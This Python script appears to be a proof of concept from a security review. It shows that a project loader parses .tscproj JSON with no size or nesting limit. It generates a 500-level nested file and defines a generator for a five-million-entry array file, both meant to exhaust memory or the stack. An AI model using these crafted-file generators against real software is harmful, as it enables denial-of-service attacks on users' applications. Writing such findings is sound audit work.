#!/usr/bin/env python3
"""REV-security-002: JSON bomb / deeply nested structure DoS.

Project.load() calls json.loads() on the .tscproj file with no size limit
or nesting depth limit. A malicious .tscproj with deeply nested JSON or
extremely large arrays can exhaust memory or cause a RecursionError.

This script creates a .tscproj with a deeply nested structure that will
consume excessive memory when loaded.
"""
import json
import shutil
import tempfile
from pathlib import Path


def create_bomb_project(dest_dir: Path, *, depth: int = 500) -> Path:
    """Create a .cmproj with deeply nested JSON."""
    cmproj = dest_dir / "bomb.cmproj"
    cmproj.mkdir(parents=True)

    # Build deeply nested dict
    data = {"sourceBin": [], "timeline": {"sceneTrack": {"scenes": []}}}
    current = data
    for i in range(depth):
        current["nested"] = {"level": i}
        current = current["nested"]

    tscproj = cmproj / "bomb.tscproj"
    tscproj.write_text(json.dumps(data))
    return cmproj


def create_large_array_project(dest_dir: Path, *, count: int = 5_000_000) -> Path:
    """Create a .cmproj with a huge sourceBin array."""
    cmproj = dest_dir / "large.cmproj"
    cmproj.mkdir(parents=True)

    # Write a minimal but huge JSON — 5M sourceBin entries
    tscproj = cmproj / "large.tscproj"
    with tscproj.open("w") as f:
        f.write('{"sourceBin": [')
        for i in range(count):
            if i > 0:
                f.write(",")
            f.write(f'{{"id": {i}, "src": "x.png", "rect": [0,0,1,1], "sourceTracks": []}}')
        f.write('], "timeline": {"sceneTrack": {"scenes": []}}}')
    return cmproj


def main() -> None:
    import sys
    import resource

    print("=== Deep nesting test ===")
    with tempfile.TemporaryDirectory() as tmp:
        proj_path = create_bomb_project(Path(tmp), depth=500)
        print(f"Created bomb project at {proj_path}")
        print(f"File size: {(proj_path / 'bomb.tscproj').stat().st_size} bytes")
        print("json.loads() will parse this without any depth limit.")
        print("Python's default recursion limit may protect against extreme depths,")
        print("but moderate depths (500-900) parse fine and consume stack space.")

    print("\n=== Large array test (description only — not allocating) ===")
    print("A .tscproj with 5M sourceBin entries would be ~500MB of JSON.")
    print("json.loads() would attempt to allocate all of it into memory.")
    print("No size check exists in Project.__init__ or Project.load().")
    print("\nVulnerability confirmed: no size or depth limits on project loading.")


if __name__ == "__main__":
    main()
